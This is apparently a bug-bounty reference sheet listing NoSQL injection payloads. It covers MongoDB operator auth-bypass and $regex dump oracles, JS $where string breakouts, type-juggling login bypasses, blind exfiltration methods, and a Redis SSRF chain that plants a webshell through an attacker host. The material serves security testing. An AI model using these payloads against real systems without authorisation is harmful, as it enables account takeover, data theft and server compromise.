# NoSQLi — Exhaustive Operator / Store Matrix

Companion to `hunt-nosqli`. That file has the *method* (auth bypass, $where time-based, regex
dump). This file is the **complete operator catalog** per store + the string-breakout and
type-juggling ladders that decide whether an injection escalates to a full dump vs a bypass.

## 1. MongoDB operator injection — the full operator list

| operator | auth-bypass / exfil effect |
|---|---|
| `{"$ne": ""}` / `{"$ne": null}` | password != wrong → always true → login |
| `{"$gt": ""}` | string comparison always true |
| `{"$lt": ""}` | also always-true variant |
| `{"$regex": ".*"}` / `{"$regex": "^a"}` | match-any / char-prefix oracle for dump |
| `{"$in": ["admin","root","administrator"]}` | match a list of guesses at once |
| `{"$nin": [...]}` | exclude everything → true |
| `{"$exists": true/false}` | field-presence oracle |
| `{"$type": "string"}` / `{"$type": 10}` (null) | type-confusion gate |
| `{"$size": N}` | array-length leak |
| `{"$all": [x]}` | array membership |
| `{"$elemMatch": {...}}` | nested-array predicate |
| `{"$or": [...]}` / `{"$and": [...]}` | boolean logic injection |
| `{"$where": "function(){ ... }"}` | arbitrary JS — **only if server passes raw $where** |
| `{"$expr": {"$eq": [...]}}` | aggregation-expression (modern bypass) |
| `{"$mod": [2,0]}` | modulo side channel |
| `{"$bitsAllSet": N}` / `{"$bitsAnySet": N}` | bitmask leak (rare) |
| `{"$regex": "^(a|b)", "$options": "i"}` | case-insensitive prefix oracle |

**The dump ladder via `$regex`:** `^a`..`^z` → `^aa`..`^az` … character-by-character. Each
step returns whether ANY document's field starts with that prefix; response length/count is the
boolean. Faster than per-char if you get counts back.

## 2. String-context breakout (when input lands in a concatenated `$where`/`find` string)

```python
# fuzz first — which char breaks out of the string?
fuzz = ["'", '"', '`', '{', ';', '$', '}', ']', '\\']
# any 500 / behaviour change = syntax reached the query

# then break (JS $where string:  this.name == '<inject>')
"' || '1'=='1"                     # always-true
"' && this.password.match(/^a/) || 'x'=='y"   # boolean char oracle
"' ; return true; //"              # early-return true
"'; return (this.role=='admin'); //"         # role check
"' + sleep(5) + '"                # time-based if sleep is defined
```

## 3. Type-juggling (loose `==` comparison in the app layer)

When the server compares a posted value to a stored value with `==` (PHP `array_key_exists`,
loose equality, Node `==`), types coerce:

```
password: true         → "abc123" == true  → true (PHP)
password: 0            → "abc123" == 0     → true (PHP ≤7, loose)
password: []           → [] == "x"         → true in some cases
password: {"$gt": ""}  → stored string > "" → true
username: ["admin"]    → array-to-string coerce → "admin"
```
The Gate 0 test: prove you logged in AS a specific user with a valid session token, not just
"the server didn't error".

## 4. Blind exfil (no reflected data)

```
rung 1  time-based  ($where sleep / $regex with expensive pattern)
rung 2  response-LENGTH delta (prefix match returns more/fewer rows)
rung 3  error-string oracle (operator vs type error is distinct)
rung 4  OOB — only if $where reaches a JS runtime with network (rare)
```

## 5. Other stores

### CouchDB
```
# _users / _all_docs with attacker-supplied selector
{"selector": {"password": {"$ne": null}}}
# N1QL-style (rare, Couchbase):  field WHERE clause injection
```
### Elasticsearch (≤ 5.0 script, modern `_search` painless)
```
# query_string injection to reach script fields
{"query": {"query_string": {"query": "<user input>"}}}      # can pivot to _exists / script
# painless (safe by default) vs groovy (pre-5.0 RCE) — version matters
```
### Redis (via SSRF, not a "NoSQL" query but the adjacent RCE)
```
gopher://127.0.0.1:6379/  →  SLAVEOF attacker → CONFIG SET dir /var/www → save  → webshell
```

## 6. Escalation rung

```
rung 1  operator accepted, no data        → Informational (confirm injection)
rung 2  auth bypass (logged in as X)       → Critical (ATO)
rung 3  char-dump of a sensitive field     → High
rung 4  full collection dump / $where JS   → High-Critical
```
Auth bypass needs a *named* account reached + a session token, not "empty session but 200".